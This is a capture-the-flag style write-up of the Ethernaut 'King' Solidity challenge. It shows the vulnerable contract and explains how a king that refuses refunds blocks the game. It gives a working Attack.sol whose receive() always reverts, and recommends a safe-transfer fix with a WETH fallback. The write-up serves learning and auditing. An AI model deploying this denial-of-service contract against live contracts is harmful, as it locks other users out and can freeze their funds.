**Description**
The contract represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! The goal is just to break the game.

* King.sol
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

```

**Attack Vector**
The contract allows the new King to remain the king and prevents anybody else from taking his spot. This behavior is due to the use of the `transfer` function to transfer the ether.

**Attack Scenario**
Attacker can send the enough amount of ether to the contract to become the new king using an attack contract. and in this contract, they should set a `fallback` function that reverts when the `King` contract is trying to refund his ether to promote a new king.

* Attack.sol
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

    constructor(address _victim) payable {
        _victim.call{value: msg.value}("");
    }

    receive() external payable {
        revert("LOL");
    }
}
```

**Recommendation**
To fix the issue, we recommend using the `safeTransferETHWithFallback` to prevent reverting the transaction.

```solidity
function _safeTransferETHWithFallback(address to, uint256 amount) internal {
    if (!_safeTransferETH(to, amount)) {
        WETH.deposit{value: amount}();
        WETH.transfer(to, amount);
    }
}
function _safeTransferETH(address to, uint256 amount)
    internal
    returns (bool)
{
    (bool success, ) = to.call{value: amount}(new bytes(0));
    return success;
}
```